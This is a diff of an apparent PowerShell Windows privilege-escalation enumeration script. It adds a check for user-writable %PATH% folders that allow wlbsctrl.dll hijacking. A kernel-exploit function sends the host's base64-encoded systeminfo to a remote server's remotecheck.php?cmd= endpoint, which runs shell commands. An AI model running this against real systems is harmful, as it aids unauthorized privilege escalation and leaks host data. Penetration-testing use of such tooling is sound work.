@@ -107,10 +107,10 @@ function Get-OthersProcessStatistics
     $myuser = $env:UserName;
     $value_to_return = $false;
 
-    if ((Get-Acl $path_to_check).access -ErrorAction SilentlyContinue | ft | Out-String | findStr $myuser | Select-String -Pattern "Allow" |Select-String "(FullControl)|(Modify)|(Write)") {return $true;}
+    if ((Get-Acl $path_to_check -ErrorAction SilentlyContinue).access | ft | Out-String | findStr $myuser | Select-String -Pattern "Allow" |Select-String "(FullControl)|(Modify)|(Write)") {return $true;}
 
     $groups = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups).Value | foreach-Object{
-      $objSID = New-Object System.Security.Principal.SecurityIdentifier ($_); 
+    $objSID = New-Object System.Security.Principal.SecurityIdentifier ($_); 
       try {
         Write-Output ($objSID.Translate( [System.Security.Principal.NTAccount])).Value  
     }
@@ -370,6 +370,12 @@ function GetWritableAutoStart{
     }    
 }
 
+
+function CheckPathDLLHijack(){
+    print_output("Path for DLL Hijack (wlbsctrl.dll): Path in the system %PATH% that are modifiable by the current user")
+    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | Where-Object{IsWritable($_)}
+}
+
 function GetRunAs{
   print_output("Checking Runas")
   cmdkey /list
@@ -418,7 +424,7 @@ function GetKernelExploits{
     $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
     (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=echo $fileContentEncoded | base64 -d > systeminfo.txt" -UseBasicParsing).content;
     (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=rm *.xls  " -UseBasicParsing).content; 
-    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=python windows-exploit-suggester.py -u " -UseBasicParsing).content; 
+    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=/usr/bin/python2.7 windows-exploit-suggester.py -u " -UseBasicParsing).content; 
     (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=/usr/bin/python2.7 windows-exploit-suggester.py -i systeminfo.txt -d  *.xls " -UseBasicParsing).content; 
     #$i = 'Elevation of Privilege';
     #(Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=python3 wes.py systeminfo.txt -i $i --exploits-only  " -UseBasicParsing).content; 
@@ -515,6 +521,7 @@ function GetAlternateDataStream{
   GetExcutableFileInCProgram
   GetWSLINfo
   GetInsecuredPermissionInRegistry
+  CheckPathDLLHijack
   GetRunAs
   GetKernelExploits
   GetUnusualCDirectory
